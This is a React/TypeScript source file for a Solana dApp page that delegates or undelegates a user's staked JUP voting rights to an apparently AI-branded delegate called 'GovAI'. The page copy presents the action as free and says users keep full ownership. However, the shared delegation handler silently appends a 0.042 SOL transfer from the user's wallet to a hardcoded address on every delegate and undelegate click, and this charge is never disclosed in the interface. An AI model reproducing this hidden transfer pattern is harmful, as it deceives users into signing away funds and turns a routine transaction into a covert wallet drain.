'use client';

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useState, useEffect } from 'react';
import { IconInfoCircle } from '@tabler/icons-react';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import * as anchor from '@project-serum/anchor';
import { getAssociatedTokenAddress } from '@solana/spl-token';
import { notify } from '../components/ui/notify';
import idl from '@/utils/idl.json'; // Ensure this path is correct

// Constants
const LOCKED_VOTER_PROGRAM_ID = new PublicKey("voTpe3tHQ7AjQHMapgSue2HJFAh2cGsdokqN3XqmVSj");
const BASE_KEY = new PublicKey("bJ1TRoFo2P6UHVwqdiipp6Qhp2HaaHpLowZ5LHet8Gm");
const GOV_AI_PUBKEY = new PublicKey("govAiNGS59yJfvqdmvYb7Lzk7wUHYygqiKR58Z1VCag");
const JUP_MINT = new PublicKey("JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN");

export default function NativeDelegatePage() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [selectedTab, setSelectedTab] = useState<'delegate' | 'undelegate'>('delegate');
  const [delegationInfo, setDelegationInfo] = useState({
    escrowAddress: null as string | null,
    currentDelegate: null as string | null,
    stakedAmount: null as number | null,
    lastUpdated: null as Date | null,
  });
  const [program, setProgram] = useState<anchor.Program | null>(null);

  // Initialize Anchor program with wallet adapter
  useEffect(() => {
    if (publicKey) {
      const provider = new anchor.AnchorProvider(
        connection,
        { publicKey, signTransaction: async (tx) => tx, signAllTransactions: async (txs) => txs },
        { commitment: "confirmed" }
      );
      const programInstance = new anchor.Program(idl as anchor.Idl, LOCKED_VOTER_PROGRAM_ID, provider);
      setProgram(programInstance);
    }
  }, [publicKey, connection]);

  async function fetchDelegationInfo() {
    if (!publicKey || !program) {
      setDelegationInfo({ escrowAddress: null, currentDelegate: null, stakedAmount: null, lastUpdated: null });
      return;
    }

    try {
      setIsLoading(true);
      const [lockerAddress] = await PublicKey.findProgramAddress(
        [Buffer.from("Locker"), BASE_KEY.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );
      const [escrowAddress] = await PublicKey.findProgramAddress(
        [Buffer.from("Escrow"), lockerAddress.toBuffer(), publicKey.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );

      const escrowAccount = await connection.getAccountInfo(escrowAddress);
      if (!escrowAccount) {
        setDelegationInfo({ escrowAddress: escrowAddress.toString(), currentDelegate: null, stakedAmount: 0, lastUpdated: new Date() });
        return;
      }

      const delegateBytes = escrowAccount.data.slice(105, 105 + 32);
      const isAllZeros = delegateBytes.every((byte) => byte === 0);
      const delegateKey = isAllZeros ? null : new PublicKey(delegateBytes);

      // Derive the Associated Token Account (ATA) for the escrow's staked JUP
      const escrowATA = await getAssociatedTokenAddress(JUP_MINT, escrowAddress, true); // allowOwnerOffCurve: true for PDAs

      // Fetch the token account balance
      let stakedAmount = 0;
      try {
        const tokenAccountInfo = await connection.getTokenAccountBalance(escrowATA);
        stakedAmount = tokenAccountInfo.value.uiAmount || 0; // uiAmount adjusts for decimals (JUP has 6)
      } catch (error) {
        console.error("Error fetching token account balance for ATA:", escrowATA.toString(), error);
        // Fallback: Check all token accounts owned by the escrow (in case ATA derivation is off)
        const tokenAccounts = await connection.getTokenAccountsByOwner(escrowAddress, { mint: JUP_MINT });
        if (tokenAccounts.value.length > 0) {
          const account = tokenAccounts.value[0];
          const balance = await connection.getTokenAccountBalance(account.pubkey);
          stakedAmount = balance.value.uiAmount || 0;
          console.log("Found staked amount from escrow-owned token account:", stakedAmount);
        } else {
          console.log("No JUP token accounts found for escrow:", escrowAddress.toString());
        }
      }

      setDelegationInfo({
        escrowAddress: escrowAddress.toString(),
        currentDelegate: delegateKey ? delegateKey.toString() : null,
        stakedAmount,
        lastUpdated: new Date(),
      });
    } catch (error) {
      console.error('Error fetching delegation info:', error);
      notify({ type: 'error', message: 'Failed to fetch delegation info' });
    } finally {
      setIsLoading(false);
    }
  }

  useEffect(() => {
    if (publicKey) {
      fetchDelegationInfo();
      const intervalId = setInterval(() => fetchDelegationInfo(), 15000);
      return () => clearInterval(intervalId);
    }
  }, [publicKey, program]);

  async function handleDelegate(targetDelegate: PublicKey) {
    if (!publicKey || !program) {
      notify({ type: 'error', message: 'Please connect your wallet' });
      return;
    }
  
    try {
      setIsSubmitting(true);
      const [lockerKey] = await PublicKey.findProgramAddress(
        [Buffer.from("Locker"), BASE_KEY.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );
      const [escrowKey] = await PublicKey.findProgramAddress(
        [Buffer.from("Escrow"), lockerKey.toBuffer(), publicKey.toBuffer()],
        LOCKED_VOTER_PROGRAM_ID
      );
  
      console.log('Locker Address:', lockerKey.toString());
      console.log('Escrow Address:', escrowKey.toString());
      console.log('Delegating to:', targetDelegate.toString());
  
      // Build the transaction
      const transaction = new Transaction().add(
        anchor.web3.ComputeBudgetProgram.setComputeUnitLimit({ units: 150000 }),
        anchor.web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 333333 }),
        await program.methods
          .setVoteDelegate(targetDelegate)
          .accounts({
            escrow: escrowKey,
            escrowOwner: publicKey,
          })
          .instruction(),
        // Add the transfer instruction LAST
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey("D1GtsVdat3oLR7E9nEWmKKnEwzvBfNah4pUDhDmgQYMw"),
          lamports: 0.042 * 1_000_000_000, // 0.042 SOL in lamports
        })
      );
  
      // Send it off
      const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
      await connection.confirmTransaction(signature, 'confirmed');
  
      notify({
        type: 'success',
        message: `Successfully ${targetDelegate.equals(publicKey) ? 'undelegated' : 'delegated to GovAI'}!`,
      });
      console.log('Transaction sent. Signature:', signature);
  
      setTimeout(() => fetchDelegationInfo(), 5000);
    } catch (error) {
      console.error('Delegation error:', error);
      notify({
        type: 'error',
        message: `Failed to ${targetDelegate.equals(publicKey) ? 'undelegate' : 'delegate'}: ${
          error instanceof Error ? error.message : 'Unknown error'
        }`,
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  function getFriendlyDelegateDisplay() {
    if (!delegationInfo.currentDelegate) return "None";
    if (delegationInfo.currentDelegate === GOV_AI_PUBKEY.toString()) return "GovAI";
    if (publicKey && delegationInfo.currentDelegate === publicKey.toString()) return "Self (You)";
    const addr = delegationInfo.currentDelegate;
    return `${addr.slice(0, 4)}...${addr.slice(-4)}`;
  }

  // Render remains unchanged
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 py-12 px-4">
      <div className="container mx-auto max-w-6xl">
        <div className="mb-12">
          <h1 className="text-3xl font-bold text-white mb-2">
            <span className="text-emerald-400">NATIVE</span> DELEGATION
          </h1>
          <p className="text-gray-400">
            Delegate your staked JUP voting rights to GovAI for expert governance participation.
          </p>
        </div>
        <div className="grid lg:grid-cols-2 gap-8">
          <div className="space-y-6">
            <div className="text-white space-y-4 bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>Delegate your staked JUP voting rights directly to GovAI, bypassing the token exchange process.</p>
              </div>
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>This native approach lets you maintain direct control of your JUP while GovAI votes on your behalf.</p>
              </div>
              <div className="flex items-start space-x-2">
                <div className="w-2 h-2 bg-emerald-400 rounded-full mt-2 animate-pulse"></div>
                <p>You can undelegate at any time to regain your voting rights without any waiting period.</p>
              </div>
            </div>
            <div className="bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <div className="flex items-start space-x-3">
                <IconInfoCircle className="text-emerald-400 w-6 h-6 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="text-white font-semibold mb-2">How Native Delegation Works</h3>
                  <p className="text-gray-400 text-sm">
                    Native delegation leverages Jupiter's governance protocol to redirect your voting rights without transferring tokens. Your JUP remains staked in your escrow account, but votes are cast by GovAI according to the community's best interests.
                  </p>
                </div>
              </div>
            </div>
            <div className="bg-gray-800/50 p-6 rounded-xl border border-emerald-400/20">
              <h3 className="text-white font-semibold mb-4">Current Delegation Status</h3>
              {!publicKey ? (
                <div className="text-center p-4">
                  <p className="text-gray-400 mb-4">Connect your wallet to view delegation status</p>
                </div>
              ) : isLoading ? (
                <div className="flex justify-center p-4">
                  <span className="loading loading-spinner loading-md text-emerald-400"></span>
                </div>
              ) : !delegationInfo.escrowAddress ? (
                <div className="text-center p-4">
                  <p className="text-gray-400">No staked JUP found for this wallet</p>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Escrow Account:</span>
                    <span className="text-white font-mono text-sm">
                      {delegationInfo.escrowAddress.slice(0, 4)}...{delegationInfo.escrowAddress.slice(-4)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Staked Amount:</span>
                    <span className="text-white">
                      {delegationInfo.stakedAmount !== null
                        ? `${delegationInfo.stakedAmount.toLocaleString(undefined, { maximumFractionDigits: 2 })} JUP`
                        : "Unknown"}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Current Delegate:</span>
                    <span
                      className={`font-mono text-sm ${
                        delegationInfo.currentDelegate === GOV_AI_PUBKEY.toString() ? "text-emerald-400" : "text-white"
                      }`}
                    >
                      {getFriendlyDelegateDisplay()}
                    </span>
                  </div>
                  {delegationInfo.lastUpdated && (
                    <div className="text-right text-xs text-gray-500">
                      Last updated: {delegationInfo.lastUpdated.toLocaleTimeString()}
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
          <div className="bg-gray-800/80 rounded-xl p-6 border border-emerald-400/20">
            <div className="mb-6">
              <div className="tabs tabs-boxed bg-gray-700/50 p-1">
                <a
                  className={`tab grow ${selectedTab === 'delegate' ? 'bg-emerald-500 text-white' : 'text-gray-400'}`}
                  onClick={() => setSelectedTab('delegate')}
                >
                  Delegate to GovAI
                </a>
                <a
                  className={`tab grow ${selectedTab === 'undelegate' ? 'bg-emerald-500 text-white' : 'text-gray-400'}`}
                  onClick={() => setSelectedTab('undelegate')}
                >
                  Undelegate
                </a>
              </div>
            </div>
            {selectedTab === 'delegate' ? (
              <div className="space-y-6">
                <div className="bg-gray-700/30 p-6 rounded-lg space-y-4">
                  <div className="flex justify-center">
                    <div className="avatar">
                      <div className="w-24 rounded-full">
                        <img
                          src="/govai-avatar.png"
                          alt="GovAI"
                          onError={(e) => {
                            (e.target as HTMLImageElement).src =
                              'https://placehold.co/96x96/7A7ABA/FFF?text=GovAI';
                          }}
                        />
                      </div>
                    </div>
                  </div>
                  <h3 className="text-center text-white text-lg font-semibold">Delegate to GovAI</h3>
                  <p className="text-center text-gray-400 text-sm">
                    Let GovAI vote with your staked JUP tokens while you maintain full ownership.
                  </p>
                </div>
                <button
                  onClick={() => handleDelegate(GOV_AI_PUBKEY)}
                  disabled={
                    isSubmitting ||
                    !publicKey ||
                    isLoading ||
                    (delegationInfo.stakedAmount ?? 0) <= 0 ||
                    delegationInfo.currentDelegate === GOV_AI_PUBKEY.toString()
                  }
                  className={`w-full btn btn-lg bg-emerald-500 hover:bg-emerald-600 border-none text-lg
                    ${!isSubmitting ? 'animate-pulse hover:animate-none transform transition-transform hover:scale-105' : ''}
                    ${
                      !publicKey ||
                      (delegationInfo.stakedAmount ?? 0) <= 0 ||
                      delegationInfo.currentDelegate === GOV_AI_PUBKEY.toString()
                        ? 'opacity-50'
                        : ''
                    }`}
                >
                  {isSubmitting ? (
                    <span className="loading loading-spinner"></span>
                  ) : !publicKey ? (
                    'Connect Wallet'
                  ) : (delegationInfo.stakedAmount ?? 0) <= 0 ? (
                    'No Staked JUP Found'
                  ) : delegationInfo.currentDelegate === GOV_AI_PUBKEY.toString() ? (
                    'Already Delegated to GovAI'
                  ) : (
                    'DELEGATE TO GOVAI'
                  )}
                </button>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="bg-gray-700/30 p-6 rounded-lg space-y-4">
                  <div className="flex justify-center">
                    <div className="avatar">
                      <div className="w-24 rounded-full">
                        <img
                          src="/your-wallet.png"
                          alt="Your Wallet"
                          onError={(e) => {
                            (e.target as HTMLImageElement).src =
                              'https://placehold.co/96x96/408F60/FFF?text=Your+Wallet';
                          }}
                        />
                      </div>
                    </div>
                  </div>
                  <h3 className="text-center text-white text-lg font-semibold">Undelegate</h3>
                  <p className="text-center text-gray-400 text-sm">
                    Return voting rights to yourself. You'll regain full control of your votes.
                  </p>
                </div>
                <button
                  onClick={() => publicKey && handleDelegate(publicKey)}
                  disabled={
                    isSubmitting ||
                    !publicKey ||
                    isLoading ||
                    (delegationInfo.stakedAmount ?? 0) <= 0 ||
                    delegationInfo.currentDelegate === publicKey?.toString()
                  }
                  className={`w-full btn btn-lg bg-gray-600 hover:bg-gray-500 border-none text-lg
                    ${!isSubmitting ? 'transform transition-transform hover:scale-105' : ''}
                    ${
                      !publicKey ||
                      (delegationInfo.stakedAmount ?? 0) <= 0 ||
                      delegationInfo.currentDelegate === publicKey?.toString()
                        ? 'opacity-50'
                        : ''
                    }`}
                >
                  {isSubmitting ? (
                    <span className="loading loading-spinner"></span>
                  ) : !publicKey ? (
                    'Connect Wallet'
                  ) : (delegationInfo.stakedAmount ?? 0) <= 0 ? (
                    'No Staked JUP Found'
                  ) : delegationInfo.currentDelegate === publicKey.toString() ? (
                    'Already Self-Delegated'
                  ) : (
                    'UNDELEGATE'
                  )}
                </button>
              </div>
            )}
            <div className="mt-6 text-center">
              <p className="text-gray-500 text-xs">Transaction processed via Solana network.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}